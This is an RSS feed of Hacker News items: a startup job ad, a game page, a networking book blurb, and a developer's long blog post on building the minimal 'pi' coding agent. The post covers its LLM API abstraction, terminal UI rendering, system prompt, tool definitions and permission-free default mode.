<?xml version='1.0' encoding='UTF-8'?>
<rss xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" version="2.0"><channel><title>Hacker News: Front Page</title><link>https://raw.githubusercontent.com/Prabesh01/hnrss-content-extract/refs/heads/main/out/rss.xml</link><description>Hacker News RSS</description><atom:link href="https://raw.githubusercontent.com/Prabesh01/hnrss-content-extract/refs/heads/main/out/rss.xml" rel="self"/><docs>http://www.rssboard.org/rss-specification</docs><generator>python-feedgen</generator><language>en</language><lastBuildDate>Sun, 01 Feb 2026 22:13:00 +0000</lastBuildDate><item><title>CollectWise (YC F24) Is Hiring</title><link>https://www.ycombinator.com/companies/collectwise/jobs/ZunnO6k-ai-agent-engineer</link><description>&lt;doc fingerprint="9b58a24f7107e484"&gt;
  &lt;main&gt;
    &lt;p&gt;Automating consumer debt collection with AI&lt;/p&gt;
    &lt;p&gt;About Us&lt;/p&gt;
    &lt;p&gt;CollectWise is a fast growing and well funded Y Combinator-backed startup. We’re using generative AI to automate debt collection, a $35B market in the US alone. Our AI agents are already outperforming human collectors by 2X, and we’re doing so at a fraction of the cost.&lt;/p&gt;
    &lt;p&gt;With a team of three, we scaled to a $1 million annualized run rate in just a few months, and we are now hiring an AI Agent Engineer to help us reach $10 million within the next year.&lt;/p&gt;
    &lt;p&gt;Role&lt;/p&gt;
    &lt;p&gt;We are hiring an AI Agent Engineer to design, optimize, and productionize the prompting and conversation logic behind our voice AI agents, while also supporting the technical systems that power customer deployments.&lt;/p&gt;
    &lt;p&gt;You’ll work at the intersection of AI quality, product outcomes, and engineering execution—owning prompt development, testing, and iteration loops that improve real-world performance (e.g., identity verification, payment conversion, dispute handling, containment rates), while collaborating closely with the founder and customers to ship improvements quickly.&lt;/p&gt;
    &lt;p&gt;This role is ideal if you’re highly analytical and business minded, love experimentation and measurement, and can also jump into back-end code and integrations when needed.&lt;/p&gt;
    &lt;p&gt;Responsibilities&lt;/p&gt;
    &lt;p&gt;Desired Qualifications&lt;/p&gt;
    &lt;p&gt;Compensation&lt;/p&gt;
    &lt;p&gt;CollectWise is revolutionizing debt recovery with autonomous AI agents and an integrated legal network. We boost recovery rates, reduce costs, and maintain a positive brand image through respectful, data-driven interactions.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46840801</guid><pubDate>Sat, 31 Jan 2026 21:00:56 +0000</pubDate></item><item><title>List animals until failure</title><link>https://rose.systems/animalist/</link><description>&lt;doc fingerprint="ca67e2b6a5f5fc5"&gt;
  &lt;main&gt;
    &lt;p&gt;Animals must have Wikipedia articles.&lt;/p&gt;
    &lt;p&gt;You have limited time, but get more time for each animal listed. When the timer runs out, that's game over.&lt;/p&gt;
    &lt;p&gt;No overlapping terms. For example, if you list “bear” and “polar bear”, you get no point (or time bonus) for the latter. But you can still get a point for a second kind of bear. Order doesn't matter.&lt;/p&gt;
    &lt;p&gt;Ignore the extraneous visuals. Focus on naming animals.&lt;/p&gt;
    &lt;p&gt;Score: 0&lt;/p&gt;
    &lt;p&gt;By Vivian Rose.&lt;/p&gt;
    &lt;p&gt;Uses Wikipedia and Wikidata, plus a lot of hand-tuning. No LLMs involved.&lt;/p&gt;
    &lt;p&gt;Contact me with bug reports, questions, suggestions, and praise.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46842603</guid><pubDate>Sun, 01 Feb 2026 01:03:23 +0000</pubDate></item><item><title>The Book of PF, 4th edition</title><link>https://nostarch.com/book-of-pf-4th-edition</link><description>&lt;doc fingerprint="b5d87975c61aab81"&gt;
  &lt;main&gt;
    &lt;div&gt;
      &lt;p&gt;Download Chapter 3: Into the Real World&lt;/p&gt;
      &lt;p&gt;The OpenBSD packet filter, PF, is central to the OpenBSD and FreeBSD network toolbox. With more services placing high demands on bandwidth and an increasingly hostile Internet environment, no sysadmin can afford to be without PF expertise.&lt;/p&gt;
      &lt;p&gt;The fourth edition of The Book of PF covers the most up-to-date developments in PF, including new content on IPv6, dual stack configurations, the “queues and priorities” traffic-shaping system, NAT and redirection, wireless networking, spam fighting, failover provisioning, logging, and more. &lt;/p&gt;
      &lt;p&gt;You’ll also learn how to:&lt;/p&gt;
      &lt;list rend="ul"&gt;
        &lt;item&gt;Create rulesets for all kinds of network traffic, IPv4 and IPv6 both, whether crossing a simple LAN, hiding behind NAT, traversing DMZs, or spanning bridges or wider networks&lt;/item&gt;
        &lt;item&gt;Set up wireless networks with access points, and lock them down using authpf and special access restrictions&lt;/item&gt;
        &lt;item&gt;Maximize flexibility and service availability via CARP, relayd, and redirection&lt;/item&gt;
        &lt;item&gt;Build adaptive firewalls to proactively defend against attackers and spammers&lt;/item&gt;
        &lt;item&gt;Harness OpenBSD’s latest traffic-shaping system to keep your network responsive, or use ALTQ and Dummynet configurations on FreeBSD to full effect&lt;/item&gt;
        &lt;item&gt;Stay in control of your traffic with monitoring and visualization tools (including NetFlow)&lt;/item&gt;
      &lt;/list&gt;
      &lt;p&gt;The Book of PF is the essential guide to building a secure network with PF. With a little effort and this book, you’ll be well prepared to unlock PF’s full potential.&lt;/p&gt;
      &lt;p&gt;Covers OpenBSD 7.x, FreeBSD 14.x, and NetBSD 10.x&lt;/p&gt;
    &lt;/div&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46844350</guid><pubDate>Sun, 01 Feb 2026 07:50:51 +0000</pubDate></item><item><title>What I learned building an opinionated and minimal coding agent</title><link>https://mariozechner.at/posts/2025-11-30-pi-coding-agent/</link><description>&lt;doc fingerprint="25589f5228878aca"&gt;
  &lt;main&gt;
    &lt;head rend="h1"&gt;What I learned building an opinionated and minimal coding agent&lt;/head&gt;
    &lt;p&gt;2025-11-30&lt;/p&gt;
    &lt;head rend="h1"&gt;Table of contents&lt;/head&gt;
    &lt;p&gt;In the past three years, I've been using LLMs for assisted coding. If you read this, you probably went through the same evolution: from copying and pasting code into ChatGPT, to Copilot auto-completions (which never worked for me), to Cursor, and finally the new breed of coding agent harnesses like Claude Code, Codex, Amp, Droid, and opencode that became our daily drivers in 2025.&lt;/p&gt;
    &lt;p&gt;I preferred Claude Code for most of my work. It was the first thing I tried back in April after using Cursor for a year and a half. Back then, it was much more basic. That fit my workflow perfectly, because I'm a simple boy who likes simple, predictable tools. Over the past few months, Claude Code has turned into a spaceship with 80% of functionality I have no use for. The system prompt and tools also change on every release, which breaks my workflows and changes model behavior. I hate that. Also, it flickers.&lt;/p&gt;
    &lt;p&gt;I've also built a bunch of agents over the years, of various complexity. For example, Sitegeist, my little browser-use agent, is essentially a coding agent that lives inside the browser. In all that work, I learned that context engineering is paramount. Exactly controlling what goes into the model's context yields better outputs, especially when it's writing code. Existing harnesses make this extremely hard or impossible by injecting stuff behind your back that isn't even surfaced in the UI.&lt;/p&gt;
    &lt;p&gt;Speaking of surfacing things, I want to inspect every aspect of my interactions with the model. Basically no harness allows that. I also want a cleanly documented session format I can post-process automatically, and a simple way to build alternative UIs on top of the agent core. While some of this is possible with existing harnesses, the APIs smell like organic evolution. These solutions accumulated baggage along the way, which shows in the developer experience. I'm not blaming anyone for this. If tons of people use your shit and you need some sort of backwards compatibility, that's the price you pay.&lt;/p&gt;
    &lt;p&gt;I've also dabbled in self-hosting, both locally and on DataCrunch. While some harnesses like opencode support self-hosted models, it usually doesn't work well. Mostly because they rely on libraries like the Vercel AI SDK, which doesn't play nice with self-hosted models for some reason, specifically when it comes to tool calling.&lt;/p&gt;
    &lt;p&gt;So what's an old guy yelling at Claudes going to do? He's going to write his own coding agent harness and give it a name that's entirely un-Google-able, so there will never be any users. Which means there will also never be any issues on the GitHub issue tracker. How hard can it be?&lt;/p&gt;
    &lt;p&gt;To make this work, I needed to build:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;pi-ai: A unified LLM API with multi-provider support (Anthropic, OpenAI, Google, xAI, Groq, Cerebras, OpenRouter, and any OpenAI-compatible endpoint), streaming, tool calling with TypeBox schemas, thinking/reasoning support, seamless cross-provider context handoffs, and token and cost tracking.&lt;/item&gt;
      &lt;item&gt;pi-agent-core: An agent loop that handles tool execution, validation, and event streaming.&lt;/item&gt;
      &lt;item&gt;pi-tui: A minimal terminal UI framework with differential rendering, synchronized output for (almost) flicker-free updates, and components like editors with autocomplete and markdown rendering.&lt;/item&gt;
      &lt;item&gt;pi-coding-agent: The actual CLI that wires it all together with session management, custom tools, themes, and project context files.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;My philosophy in all of this was: if I don't need it, it won't be built. And I don't need a lot of things.&lt;/p&gt;
    &lt;head rend="h2"&gt;pi-ai and pi-agent-core&lt;/head&gt;
    &lt;p&gt;I'm not going to bore you with the API specifics of this package. You can read it all in the README.md. Instead, I want to document the problems I ran into while creating a unified LLM API and how I resolved them. I'm not claiming my solutions are the best, but they've been working pretty well throughout various agentic and non-agentic LLM projects.&lt;/p&gt;
    &lt;head rend="h3"&gt;There. Are. Four. Ligh... APIs&lt;/head&gt;
    &lt;p&gt;There's really only four APIs you need to speak to talk to pretty much any LLM provider: OpenAI's Completions API, their newer Responses API, Anthropic's Messages API, and Google's Generative AI API.&lt;/p&gt;
    &lt;p&gt;They're all pretty similar in features, so building an abstraction on top of them isn't rocket science. There are, of course, provider-specific peculiarities you have to care for. That's especially true for the Completions API, which is spoken by pretty much all providers, but each of them has a different understanding of what this API should do. For example, while OpenAI doesn't support reasoning traces in their Completions API, other providers do in their version of the Completions API. This is also true for inference engines like llama.cpp, Ollama, vLLM, and LM Studio.&lt;/p&gt;
    &lt;p&gt;For example, in openai-completions.ts:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Cerebras, xAI, Mistral, and Chutes don't like the &lt;code&gt;store&lt;/code&gt;field&lt;/item&gt;
      &lt;item&gt;Mistral and Chutes use &lt;code&gt;max_tokens&lt;/code&gt;instead of&lt;code&gt;max_completion_tokens&lt;/code&gt;&lt;/item&gt;
      &lt;item&gt;Cerebras, xAI, Mistral, and Chutes don't support the &lt;code&gt;developer&lt;/code&gt;role for system prompts&lt;/item&gt;
      &lt;item&gt;Grok models don't like &lt;code&gt;reasoning_effort&lt;/code&gt;&lt;/item&gt;
      &lt;item&gt;Different providers return reasoning content in different fields (&lt;code&gt;reasoning_content&lt;/code&gt;vs&lt;code&gt;reasoning&lt;/code&gt;)&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;To ensure all features actually work across the gazillion of providers, pi-ai has a pretty extensive test suite covering image inputs, reasoning traces, tool calling, and other features you'd expect from an LLM API. Tests run across all supported providers and popular models. While this is a good effort, it still won't guarantee that new models and providers will just work out of the box.&lt;/p&gt;
    &lt;p&gt;Another big difference is how providers report tokens and cache reads/writes. Anthropic has the sanest approach, but generally it's the Wild West. Some report token counts at the start of the SSE stream, others only at the end, making accurate cost tracking impossible if a request is aborted. To add insult to injury, you can't provide a unique ID to later correlate with their billing APIs and figure out which of your users consumed how many tokens. So pi-ai does token and cache tracking on a best-effort basis. Good enough for personal use, but not for accurate billing if you have end users consuming tokens through your service.&lt;/p&gt;
    &lt;p&gt;Special shout out to Google who to this date seem to not support tool call streaming which is extremely Google.&lt;/p&gt;
    &lt;p&gt;pi-ai also works in the browser, which is useful for building web-based interfaces. Some providers make this especially easy by supporting CORS, specifically Anthropic and xAI.&lt;/p&gt;
    &lt;head rend="h3"&gt;Context handoff&lt;/head&gt;
    &lt;p&gt;Context handoff between providers was a feature pi-ai was designed for from the start. Since each provider has their own way of tracking tool calls and thinking traces, this can only be a best-effort thing. For example, if you switch from Anthropic to OpenAI mid-session, Anthropic thinking traces are converted to content blocks inside assistant messages, delimited by &lt;code&gt;&amp;lt;thinking&amp;gt;&amp;lt;/thinking&amp;gt;&lt;/code&gt; tags. This may or may not be sensible, because the thinking traces returned by Anthropic and OpenAI don't actually represent what's happening behind the scenes.&lt;/p&gt;
    &lt;p&gt;These providers also insert signed blobs into the event stream that you have to replay on subsequent requests containing the same messages. This also applies when switching models within a provider. It makes for a cumbersome abstraction and transformation pipeline in the background.&lt;/p&gt;
    &lt;p&gt;I'm happy to report that cross-provider context handoff and context serialization/deserialization work pretty well in pi-ai:&lt;/p&gt;
    &lt;code&gt;import { getModel, complete, Context } from '@mariozechner/pi-ai';

// Start with Claude
const claude = getModel('anthropic', 'claude-sonnet-4-5');
const context: Context = {
  messages: []
};

context.messages.push({ role: 'user', content: 'What is 25 * 18?' });
const claudeResponse = await complete(claude, context, {
  thinkingEnabled: true
});
context.messages.push(claudeResponse);

// Switch to GPT - it will see Claude's thinking as &amp;lt;thinking&amp;gt; tagged text
const gpt = getModel('openai', 'gpt-5.1-codex');
context.messages.push({ role: 'user', content: 'Is that correct?' });
const gptResponse = await complete(gpt, context);
context.messages.push(gptResponse);

// Switch to Gemini
const gemini = getModel('google', 'gemini-2.5-flash');
context.messages.push({ role: 'user', content: 'What was the question?' });
const geminiResponse = await complete(gemini, context);

// Serialize context to JSON (for storage, transfer, etc.)
const serialized = JSON.stringify(context);

// Later: deserialize and continue with any model
const restored: Context = JSON.parse(serialized);
restored.messages.push({ role: 'user', content: 'Summarize our conversation' });
const continuation = await complete(claude, restored);
&lt;/code&gt;
    &lt;head rend="h3"&gt;We live in a multi-model world&lt;/head&gt;
    &lt;p&gt;Speaking of models, I wanted a typesafe way of specifying them in the &lt;code&gt;getModel&lt;/code&gt; call. For that I needed a model registry that I could turn into TypeScript types. I'm parsing data from both OpenRouter and models.dev (created by the opencode folks, thanks for that, it's super useful) into models.generated.ts. This includes token costs and capabilities like image inputs and thinking support.&lt;/p&gt;
    &lt;p&gt;And if I ever need to add a model that's not in the registry, I wanted a type system that makes it easy to create new ones. This is especially useful when working with self-hosted models, new releases that aren't yet on models.dev or OpenRouter, or trying out one of the more obscure LLM providers:&lt;/p&gt;
    &lt;code&gt;import { Model, stream } from '@mariozechner/pi-ai';

const ollamaModel: Model&amp;lt;'openai-completions'&amp;gt; = {
  id: 'llama-3.1-8b',
  name: 'Llama 3.1 8B (Ollama)',
  api: 'openai-completions',
  provider: 'ollama',
  baseUrl: 'http://localhost:11434/v1',
  reasoning: false,
  input: ['text'],
  cost: { input: 0, output: 0, cacheRead: 0, cacheWrite: 0 },
  contextWindow: 128000,
  maxTokens: 32000
};

const response = await stream(ollamaModel, context, {
  apiKey: 'dummy' // Ollama doesn't need a real key
});
&lt;/code&gt;
    &lt;p&gt;Many unified LLM APIs completely ignore providing a way to abort requests. This is entirely unacceptable if you want to integrate your LLM into any kind of production system. Many unified LLM APIs also don't return partial results to you, which is kind of ridiculous. pi-ai was designed from the beginning to support aborts throughout the entire pipeline, including tool calls. Here's how it works:&lt;/p&gt;
    &lt;code&gt;import { getModel, stream } from '@mariozechner/pi-ai';

const model = getModel('openai', 'gpt-5.1-codex');
const controller = new AbortController();

// Abort after 2 seconds
setTimeout(() =&amp;gt; controller.abort(), 2000);

const s = stream(model, {
  messages: [{ role: 'user', content: 'Write a long story' }]
}, {
  signal: controller.signal
});

for await (const event of s) {
  if (event.type === 'text_delta') {
    process.stdout.write(event.delta);
  } else if (event.type === 'error') {
    console.log(`${event.reason === 'aborted' ? 'Aborted' : 'Error'}:`, event.error.errorMessage);
  }
}

// Get results (may be partial if aborted)
const response = await s.result();
if (response.stopReason === 'aborted') {
  console.log('Partial content:', response.content);
}
&lt;/code&gt;
    &lt;head rend="h3"&gt;Structured split tool results&lt;/head&gt;
    &lt;p&gt;Another abstraction I haven't seen in any unified LLM API is splitting tool results into a portion handed to the LLM and a portion for UI display. The LLM portion is generally just text or JSON, which doesn't necessarily contain all the information you'd want to show in a UI. It also sucks hard to parse textual tool outputs and restructure them for display in a UI. pi-ai's tool implementation allows returning both content blocks for the LLM and separate content blocks for UI rendering. Tools can also return attachments like images that get attached in the native format of the respective provider. Tool arguments are automatically validated using TypeBox schemas and AJV, with detailed error messages when validation fails:&lt;/p&gt;
    &lt;code&gt;import { Type, AgentTool } from '@mariozechner/pi-ai';

const weatherSchema = Type.Object({
  city: Type.String({ minLength: 1 }),
});

const weatherTool: AgentTool&amp;lt;typeof weatherSchema, { temp: number }&amp;gt; = {
  name: 'get_weather',
  description: 'Get current weather for a city',
  parameters: weatherSchema,
  execute: async (toolCallId, args) =&amp;gt; {
    const temp = Math.round(Math.random() * 30);
    return {
      // Text for the LLM
      output: `Temperature in ${args.city}: ${temp}Â°C`,
      // Structured data for the UI
      details: { temp }
    };
  }
};

// Tools can also return images
const chartTool: AgentTool = {
  name: 'generate_chart',
  description: 'Generate a chart from data',
  parameters: Type.Object({ data: Type.Array(Type.Number()) }),
  execute: async (toolCallId, args) =&amp;gt; {
    const chartImage = await generateChartImage(args.data);
    return {
      content: [
        { type: 'text', text: `Generated chart with ${args.data.length} data points` },
        { type: 'image', data: chartImage.toString('base64'), mimeType: 'image/png' }
      ]
    };
  }
};
&lt;/code&gt;
    &lt;p&gt;What's still lacking is tool result streaming. Imagine a bash tool where you want to display ANSI sequences as they come in. That's currently not possible, but it's a simple fix that will eventually make it into the package.&lt;/p&gt;
    &lt;p&gt;Partial JSON parsing during tool call streaming is essential for good UX. As the LLM streams tool call arguments, pi-ai progressively parses them so you can show partial results in the UI before the call completes. For example, you can display a diff streaming in as the agent rewrites a file.&lt;/p&gt;
    &lt;head rend="h3"&gt;Minimal agent scaffold&lt;/head&gt;
    &lt;p&gt;Finally, pi-ai provides an agent loop that handles the full orchestration: processing user messages, executing tool calls, feeding results back to the LLM, and repeating until the model produces a response without tool calls. The loop also supports message queuing via a callback: after each turn, it asks for queued messages and injects them before the next assistant response. The loop emits events for everything, making it easy to build reactive UIs.&lt;/p&gt;
    &lt;p&gt;The agent loop doesn't let you specify max steps or similar knobs you'd find in other unified LLM APIs. I never found a use case for that, so why add it? The loop just loops until the agent says it's done. On top of the loop, however, pi-agent-core provides an &lt;code&gt;Agent&lt;/code&gt; class with actually useful stuff: state management, simplified event subscriptions, message queuing with two modes (one-at-a-time or all-at-once), attachment handling (images, documents), and a transport abstraction that lets you run the agent either directly or through a proxy.&lt;/p&gt;
    &lt;p&gt;Am I happy with pi-ai? For the most part, yes. Like any unifying API, it can never be perfect due to leaky abstractions. But it's been used in seven different production projects and has served me extremely well.&lt;/p&gt;
    &lt;p&gt;Why build this instead of using the Vercel AI SDK? Armin's blog post mirrors my experience. Building on top of the provider SDKs directly gives me full control and lets me design the APIs exactly as I want, with a much smaller surface area. Armin's blog gives you a more in-depth treatise on the reasons for building your own. Go read that.&lt;/p&gt;
    &lt;head rend="h2"&gt;pi-tui&lt;/head&gt;
    &lt;p&gt;I grew up in the DOS era, so terminal user interfaces are what I grew up with. From the fancy setup programs for Doom to Borland products, TUIs were with me until the end of the 90s. And boy was I fucking happy when I eventually switched to a GUI operating system. While TUIs are mostly portable and easily streamable, they also suck at information density. Having said all that, I thought starting with a terminal user interface for pi makes the most sense. I could strap on a GUI later whenever I felt like I needed to.&lt;/p&gt;
    &lt;p&gt;So why build my own TUI framework? I've looked into the alternatives like Ink, Blessed, OpenTUI, and so on. I'm sure they're all fine in their own way, but I definitely don't want to write my TUI like a React app. Blessed seems to be mostly unmaintained, and OpenTUI is explicitly not production ready. Also, writing my own TUI framework on top of Node.js seemed like a fun little challenge.&lt;/p&gt;
    &lt;head rend="h3"&gt;Two kinds of TUIs&lt;/head&gt;
    &lt;p&gt;Writing a terminal user interface is not rocket science per se. You just have to pick your poison. There's basically two ways to do it. One is to take ownership of the terminal viewport (the portion of the terminal contents you can actually see) and treat it like a pixel buffer. Instead of pixels you have cells that contain characters with background color, foreground color, and styling like italic and bold. I call these full screen TUIs. Amp and opencode use this approach.&lt;/p&gt;
    &lt;p&gt;The drawback is that you lose the scrollback buffer, which means you have to implement custom search. You also lose scrolling, which means you have to simulate scrolling within the viewport yourself. While this is not hard to implement, it means you have to re-implement all the functionality your terminal emulator already provides. Mouse scrolling specifically always feels kind of off in such TUIs.&lt;/p&gt;
    &lt;p&gt;The second approach is to just write to the terminal like any CLI program, appending content to the scrollback buffer, only occasionally moving the "rendering cursor" back up a little within the visible viewport to redraw things like animated spinners or a text edit field. It's not exactly that simple, but you get the idea. This is what Claude Code, Codex, and Droid do.&lt;/p&gt;
    &lt;p&gt;Coding agents have this nice property that they're basically a chat interface. The user writes a prompt, followed by replies from the agent and tool calls and their results. Everything is nicely linear, which lends itself well to working with the "native" terminal emulator. You get to use all the built-in functionality like natural scrolling and search within the scrollback buffer. It also limits what your TUI can do to some degree, which I find charming because constraints make for minimal programs that just do what they're supposed to do without superfluous fluff. This is the direction I picked for pi-tui.&lt;/p&gt;
    &lt;head rend="h3"&gt;Retained mode UI&lt;/head&gt;
    &lt;p&gt;If you've done any GUI programming, you've probably heard of retained mode vs immediate mode. In a retained mode UI, you build up a tree of components that persist across frames. Each component knows how to render itself and can cache its output if nothing changed. In an immediate mode UI, you redraw everything from scratch each frame (though in practice, immediate mode UIs also do caching, otherwise they'd fall apart).&lt;/p&gt;
    &lt;p&gt;pi-tui uses a simple retained mode approach. A &lt;code&gt;Component&lt;/code&gt; is just an object with a &lt;code&gt;render(width)&lt;/code&gt; method that returns an array of strings (lines that fit the viewport horizontally, with ANSI escape codes for colors and styling) and an optional &lt;code&gt;handleInput(data)&lt;/code&gt; method for keyboard input. A &lt;code&gt;Container&lt;/code&gt; holds a list of components arranged vertically and collects all their rendered lines. The &lt;code&gt;TUI&lt;/code&gt; class is itself a container that orchestrates everything.&lt;/p&gt;
    &lt;p&gt;When the TUI needs to update the screen, it asks each component to render. Components can cache their output: an assistant message that's fully streamed doesn't need to re-parse markdown and re-render ANSI sequences every time. It just returns the cached lines. Containers collect lines from all children. The TUI gathers all these lines and compares them to the lines it previously rendered for the previous component tree. It keeps a backbuffer of sorts, remembering what was written to the scrollback buffer.&lt;/p&gt;
    &lt;p&gt;Then it only redraws what changed, using a method I call differential rendering. I'm very bad with names, and this likely has an official name.&lt;/p&gt;
    &lt;head rend="h3"&gt;Differential rendering&lt;/head&gt;
    &lt;p&gt;Here's a simplified demo that illustrates what exactly gets redrawn.&lt;/p&gt;
    &lt;p&gt;The algorithm is simple:&lt;/p&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;First render: Just output all lines to the terminal&lt;/item&gt;
      &lt;item&gt;Width changed: Clear screen completely and re-render everything (soft wrapping changes)&lt;/item&gt;
      &lt;item&gt;Normal update: Find the first line that differs from what's on screen, move the cursor to that line, and re-render from there to the end&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;There's one catch: if the first changed line is above the visible viewport (the user scrolled up), we have to do a full clear and re-render. The terminal doesn't let you write to the scrollback buffer above the viewport.&lt;/p&gt;
    &lt;p&gt;To prevent flicker during updates, pi-tui wraps all rendering in synchronized output escape sequences (&lt;code&gt;CSI ?2026h&lt;/code&gt; and &lt;code&gt;CSI ?2026l&lt;/code&gt;). This tells the terminal to buffer all the output and display it atomically. Most modern terminals support this.&lt;/p&gt;
    &lt;p&gt;How well does it work and how much does it flicker? In any capable terminal like Ghostty or iTerm2, this works brilliantly and you never see any flicker. In less fortunate terminal implementations like VS Code's built-in terminal, you will get some flicker depending on the time of day, your display size, your window size, and so on. Given that I'm very accustomed to Claude Code, I haven't spent any more time optimizing this. I'm happy with the little flicker I get in VS Code. I wouldn't feel at home otherwise. And it still flickers less than Claude Code.&lt;/p&gt;
    &lt;p&gt;How wasteful is this approach? We store an entire scrollback buffer worth of previously rendered lines, and we re-render lines every time the TUI is asked to render itself. That's alleviated with the caching I described above, so the re-rendering isn't a big deal. We still have to compare a lot of lines with each other. Realistically, on computers younger than 25 years, this is not a big deal, both in terms of performance and memory use (a few hundred kilobytes for very large sessions). Thanks V8. What I get in return is a dead simple programming model that lets me iterate quickly.&lt;/p&gt;
    &lt;head rend="h2"&gt;pi-coding-agent&lt;/head&gt;
    &lt;p&gt;I don't need to explain what features you should expect from a coding agent harness. pi comes with most creature comforts you're used to from other tools:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;
        &lt;p&gt;Runs on Windows, Linux, and macOS (or anything with a Node.js runtime and a terminal)&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Multi-provider support with mid-session model switching&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Session management with continue, resume, and branching&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Project context files (AGENTS.md) loaded hierarchically from global to project-specific&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Slash commands for common operations&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Custom slash commands as markdown templates with argument support&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;OAuth authentication for Claude Pro/Max subscriptions&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Custom model and provider configuration via JSON&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Customizable themes with live reload&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Editor with fuzzy file search, path completion, drag &amp;amp; drop, and multi-line paste&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Message queuing while the agent is working&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Image support for vision-capable models&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;HTML export of sessions&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Headless operation via JSON streaming and RPC mode&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Full cost and token tracking&lt;/p&gt;
      &lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;If you want the full rundown, read the README. What's more interesting is where pi deviates from other harnesses in philosophy and implementation.&lt;/p&gt;
    &lt;head rend="h3"&gt;Minimal system prompt&lt;/head&gt;
    &lt;p&gt;Here's the system prompt:&lt;/p&gt;
    &lt;code&gt;You are an expert coding assistant. You help users with coding tasks by reading files, executing commands, editing code, and writing new files.

Available tools:
- read: Read file contents
- bash: Execute bash commands
- edit: Make surgical edits to files
- write: Create or overwrite files

Guidelines:
- Use bash for file operations like ls, grep, find
- Use read to examine files before editing
- Use edit for precise changes (old text must match exactly)
- Use write only for new files or complete rewrites
- When summarizing your actions, output plain text directly - do NOT use cat or bash to display what you did
- Be concise in your responses
- Show file paths clearly when working with files

Documentation:
- Your own documentation (including custom model setup and theme creation) is at: /path/to/README.md
- Read it when users ask about features, configuration, or setup, and especially if the user asks you to add a custom model or provider, or create a custom theme.
&lt;/code&gt;
    &lt;p&gt;That's it. The only thing that gets injected at the bottom is your AGENTS.md file. Both the global one that applies to all your sessions and the project-specific one stored in your project directory. This is where you can customize pi to your liking. You can even replace the full system prompt if you want to. Compared to, for example, Claude Code's system prompt, Codex's system prompt, or opencode's model-specific prompts (the Claude one is a cut-down version of the original Claude Code prompt they copied).&lt;/p&gt;
    &lt;p&gt;You might think this is crazy. In all likelihood, the models have some training on their native coding harness. So using the native system prompt or something close to it like opencode would be most ideal. But it turns out that all the frontier models have been RL-trained up the wazoo, so they inherently understand what a coding agent is. There does not appear to be a need for 10,000 tokens of system prompt, as we'll find out later in the benchmark section, and as I've anecdotally found out by exclusively using pi for the past few weeks. Amp, while copying some parts of the native system prompts, seems to also do just fine with their own prompt.&lt;/p&gt;
    &lt;head rend="h3"&gt;Minimal toolset&lt;/head&gt;
    &lt;p&gt;Here are the tool definitions:&lt;/p&gt;
    &lt;code&gt;read
  Read the contents of a file. Supports text files and images (jpg, png,
  gif, webp). Images are sent as attachments. For text files, defaults to
  first 2000 lines. Use offset/limit for large files.
  - path: Path to the file to read (relative or absolute)
  - offset: Line number to start reading from (1-indexed)
  - limit: Maximum number of lines to read

write
  Write content to a file. Creates the file if it doesn't exist, overwrites
  if it does. Automatically creates parent directories.
  - path: Path to the file to write (relative or absolute)
  - content: Content to write to the file

edit
  Edit a file by replacing exact text. The oldText must match exactly
  (including whitespace). Use this for precise, surgical edits.
  - path: Path to the file to edit (relative or absolute)
  - oldText: Exact text to find and replace (must match exactly)
  - newText: New text to replace the old text with

bash
  Execute a bash command in the current working directory. Returns stdout
  and stderr. Optionally provide a timeout in seconds.
  - command: Bash command to execute
  - timeout: Timeout in seconds (optional, no default timeout)
&lt;/code&gt;
    &lt;p&gt;There are additional read-only tools (grep, find, ls) if you want to restrict the agent from modifying files or running arbitrary commands. By default these are disabled, so the agent only gets the four tools above.&lt;/p&gt;
    &lt;p&gt;As it turns out, these four tools are all you need for an effective coding agent. Models know how to use bash and have been trained on the read, write, and edit tools with similar input schemas. Compare this to Claude Code's tool definitions or opencode's tool definitions (which are clearly derived from Claude Code's, same structure, same examples, same git commit flow). Notably, Codex's tool definitions are similarly minimal to pi's.&lt;/p&gt;
    &lt;p&gt;pi's system prompt and tool definitions together come in below 1000 tokens.&lt;/p&gt;
    &lt;head rend="h3"&gt;YOLO by default&lt;/head&gt;
    &lt;p&gt;pi runs in full YOLO mode and assumes you know what you're doing. It has unrestricted access to your filesystem and can execute any command without permission checks or safety rails. No permission prompts for file operations or commands. No pre-checking of bash commands by Haiku for malicious content. Full filesystem access. Can execute any command with your user privileges.&lt;/p&gt;
